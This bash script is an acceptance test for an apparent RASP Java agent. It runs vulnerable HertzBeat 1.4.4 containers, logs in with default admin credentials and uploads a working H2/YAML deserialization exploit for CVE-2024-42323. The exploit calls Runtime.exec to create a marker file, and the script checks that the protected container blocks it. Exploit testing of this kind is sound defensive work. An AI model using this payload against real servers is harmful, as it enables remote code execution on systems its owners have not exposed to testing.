#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_HERTZBEAT_IMAGE:-vulhub/hertzbeat:1.4.4}"
baseline_name="${OHMYRASP_VULHUB_HERTZBEAT_BASELINE_NAME:-ohmyrasp-vulhub-hertzbeat1423-baseline}"
protected_name="${OHMYRASP_VULHUB_HERTZBEAT_PROTECTED_NAME:-ohmyrasp-vulhub-hertzbeat1423-protected}"
baseline_port="${OHMYRASP_VULHUB_HERTZBEAT_BASELINE_PORT:-18320}"
protected_port="${OHMYRASP_VULHUB_HERTZBEAT_PROTECTED_PORT:-18321}"
host_agent_jar="$(pwd)/agent-java11/build/libs/ohmyrasp-agent-java11.jar"
baseline_dir="logs/vulhub-hertzbeat-1.4.4-java11-baseline"
protected_dir="logs/vulhub-hertzbeat-1.4.4-java11-protected"
protected_log="${protected_dir}/events.jsonl"
success_file="/tmp/ohmyrasp-hertzbeat-success"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java11:agentJava11Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" -p "${baseline_port}:1157" \
  "$image" >/dev/null

docker run -d --name "$protected_name" -p "${protected_port}:1157" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java11.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java11.jar -Dohmyrasp.java11.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java11.block=true" \
  "$image" >/dev/null

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 180); do
    status="$(curl -sS -o "/tmp/${name}.html" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" || true)"
    if [[ "$status" == "200" ]]; then
      return
    fi
    sleep 1
  done
  echo "${name} did not expose HertzBeat at ${port}" >&2
  exit 1
}

login_token() {
  local port="$1"
  local output="$2"
  curl -sS -X POST \
    -H 'Content-Type: application/json' \
    -d '{"identifier":"admin","credential":"hertzbeat"}' \
    "http://127.0.0.1:${port}/api/account/auth/form" \
    > "$output"
  sed -n 's/.*"token":"\([^"]*\)".*/\1/p' "$output"
}

upload_h2_yaml() {
  local port="$1"
  local token="$2"
  local output="$3"
  local payload
  payload='!!org.h2.jdbc.JdbcConnection [ "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"touch /tmp/ohmyrasp-hertzbeat-success\")\\; }$$\\;CALL EXEC ()\\;", [], "a", "b", false ]'
  printf '%s\n' "$payload" | curl -sS -i -X POST \
    -H "Authorization: Bearer ${token}" \
    -F "file=@-;filename=poc.yaml;type=application/x-yaml" \
    -o "$output" \
    -w "%{http_code}" \
    "http://127.0.0.1:${port}/api/monitors/import" || true
}

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"

if ! grep -q '"event":"ohmyrasp-java11-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 11 startup event in HertzBeat protected container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "HertzBeat protected startup produced a detection before the exploit request" >&2
  exit 1
fi

baseline_token="$(login_token "$baseline_port" "${baseline_dir}/login.json")"
protected_token="$(login_token "$protected_port" "${protected_dir}/login.json")"
if [[ -z "$baseline_token" || -z "$protected_token" ]]; then
  cat "${baseline_dir}/login.json" >&2 || true
  cat "${protected_dir}/login.json" >&2 || true
  echo "HertzBeat login did not return tokens" >&2
  exit 1
fi

baseline_status="$(upload_h2_yaml "$baseline_port" "$baseline_token" "${baseline_dir}/h2-yaml-import.response")"
if [[ "$baseline_status" != "409" ]] || ! docker exec "$baseline_name" test -f "$success_file"; then
  cat "${baseline_dir}/h2-yaml-import.response" >&2 || true
  echo "baseline HertzBeat did not execute the H2 YAML import payload" >&2
  exit 1
fi

protected_status="$(upload_h2_yaml "$protected_port" "$protected_token" "${protected_dir}/h2-yaml-import.response")"
if [[ "$protected_status" != "409" ]]; then
  cat "${protected_dir}/h2-yaml-import.response" >&2 || true
  echo "protected HertzBeat import returned unexpected status ${protected_status}" >&2
  exit 1
fi
if docker exec "$protected_name" test -f "$success_file"; then
  echo "protected HertzBeat created ${success_file} despite Java11 RASP" >&2
  exit 1
fi
if ! grep -q '"hook":"org.h2.jdbc.JdbcConnection.<init>".*"algorithm":"java11_jdbc_h2_code_execution".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java11_jdbc_h2_code_execution block event for HertzBeat CVE-2024-42323" >&2
  exit 1
fi

echo "vulhub HertzBeat 1.4.4 CVE-2024-42323 Java11 acceptance passed"
